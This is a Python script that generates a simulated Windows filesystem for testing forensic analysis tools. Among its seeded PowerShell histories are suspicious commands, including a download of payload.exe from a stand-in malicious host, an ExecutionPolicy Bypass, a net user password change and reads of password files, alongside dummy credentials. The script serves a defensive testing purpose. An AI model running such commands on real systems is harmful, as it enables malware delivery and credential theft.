#!/usr/bin/env python3
"""
Create a Windows test filesystem structure for forensic analysis testing.
"""

import os
from pathlib import Path


def create_windows_structure():
    """Create a Windows-like directory structure with PowerShell history."""
    
    # Create in forensic_images directory
    base_dir = Path('forensic_images') / 'windows_test_fs'
    base_dir.mkdir(parents=True, exist_ok=True)
    
    # Create main Windows directories
    dirs = [
        'Windows/System32',
        'Users/Administrator',
        'Users/JohnDoe',
        'Users/JaneSmith',
        'Users/Public',
        'Program Files',
        'ProgramData',
    ]
    
    for d in dirs:
        (base_dir / d).mkdir(parents=True, exist_ok=True)
    
    # PowerShell history path structure
    ps_path = 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine'
    
    # Create Administrator PowerShell history
    admin_ps_dir = base_dir / 'Users' / 'Administrator' / ps_path
    admin_ps_dir.mkdir(parents=True, exist_ok=True)
    
    admin_history = """Get-ChildItem C:\\Users
Get-Process
Get-Service | Where-Object {$_.Status -eq "Running"}
netstat -ano
ipconfig /all
Get-EventLog -LogName Security -Newest 10
net user Administrator P@ssw0rd123
reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion
powershell -ExecutionPolicy Bypass -File C:\\Temp\\script.ps1
Invoke-WebRequest -Uri http://malicious-site.com/payload.exe -OutFile C:\\Temp\\payload.exe
Start-Process -FilePath "C:\\Windows\\System32\\cmd.exe" -Verb RunAs
Get-WmiObject Win32_ComputerSystem
"""
    (admin_ps_dir / 'ConsoleHost_history.txt').write_text(admin_history)
    
    # Create JohnDoe PowerShell history
    john_ps_dir = base_dir / 'Users' / 'JohnDoe' / ps_path
    john_ps_dir.mkdir(parents=True, exist_ok=True)
    
    john_history = """dir
cd Documents
type secret.txt
ping 192.168.1.1
nslookup google.com
ssh john@company-server.com
Get-Content passwords.txt
Copy-Item C:\\Users\\JohnDoe\\Documents\\*.docx -Destination D:\\Backup
Remove-Item C:\\Temp\\*.tmp -Force
"""
    (john_ps_dir / 'ConsoleHost_history.txt').write_text(john_history)
    
    # Create JaneSmith PowerShell history
    jane_ps_dir = base_dir / 'Users' / 'JaneSmith' / ps_path
    jane_ps_dir.mkdir(parents=True, exist_ok=True)
    
    jane_history = """Get-Help Get-Process
cd C:\\Projects
git status
git commit -m "Updated config"
python manage.py runserver
docker ps
curl http://api.example.com/data
"""
    (jane_ps_dir / 'ConsoleHost_history.txt').write_text(jane_history)
    
    # Create some system files
    (base_dir / 'Windows' / 'System32' / 'drivers' / 'etc').mkdir(parents=True, exist_ok=True)
    (base_dir / 'Windows' / 'System32' / 'drivers' / 'etc' / 'hosts').write_text("""# Windows hosts file
127.0.0.1       localhost
192.168.1.100   internal-server
""")
    
    # Create user documents
    (base_dir / 'Users' / 'JohnDoe' / 'Documents').mkdir(parents=True, exist_ok=True)
    (base_dir / 'Users' / 'JohnDoe' / 'Documents' / 'notes.txt').write_text("""Project Notes
- Meeting with team at 2pm
- Email: john.doe@company.com
- Server IP: 192.168.1.50
""")
    
    (base_dir / 'Users' / 'JaneSmith' / 'Documents').mkdir(parents=True, exist_ok=True)
    (base_dir / 'Users' / 'JaneSmith' / 'Documents' / 'credentials.txt').write_text("""Database Credentials
Username: admin
Password: SuperSecret123!
Server: db.company.local
""")
    
    # Create README
    (base_dir / 'README.txt').write_text("""Windows Test Filesystem Structure
===================================

This directory simulates a Windows 10/11 filesystem.

System Information:
- OS: Windows 10/11
- Computer Name: WIN-TEST-PC
- Users: Administrator, JohnDoe, JaneSmith

User Accounts:
- Administrator - System administrator with elevated privileges
- JohnDoe - Regular user account
- JaneSmith - Developer account

PowerShell History Files:
- All users have PowerShell command history in:
  Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

Key Files for Testing:
- PowerShell histories contain various commands including:
  * Network commands (netstat, ipconfig, ping, nslookup)
  * Security-related (Get-EventLog, net user)
  * Potentially suspicious (Invoke-WebRequest, ExecutionPolicy Bypass)
  * File operations (Copy-Item, Remove-Item)
  
- Documents folder contains:
  * notes.txt with email and IP addresses
  * credentials.txt with passwords (for YARA testing)

Command History Analysis Opportunities:
- Administrator: 12 commands (including suspicious downloads and privilege escalation)
- JohnDoe: 9 commands (SSH, file access, network operations)
- JaneSmith: 7 commands (development tools, git, docker, API calls)

Expected Detection:
- YARA: emails, IPs, passwords, URLs
- Command History: 28 total commands across 3 users
- Suspicious Commands: PowerShell bypass, web downloads, credential access
""")
    
    print("=" * 70)
    print("✓ Created Windows Test Filesystem Structure")
    print("=" * 70)
    print(f"\nLocation: {base_dir.absolute()}")
    print("\nContents:")
    print("  - OS: Windows 10/11 structure")
    print("  - Users: Administrator, JohnDoe, JaneSmith")
    print("  - PowerShell History: 3 files with 28 total commands")
    print("  - Test Files: Documents, credentials, hosts file")
    print("\nNext steps:")
    print("  1. Create filesystem image with WSL:")
    print(f"     cd forensic_images")
    print(f"     wsl mkfs.ext4 -F -d windows_test_fs test_windows.dd 100M")
    print("\n  2. Or test with the directory structure directly")
    print("=" * 70)
    
    return base_dir


if __name__ == '__main__':
    create_windows_structure()
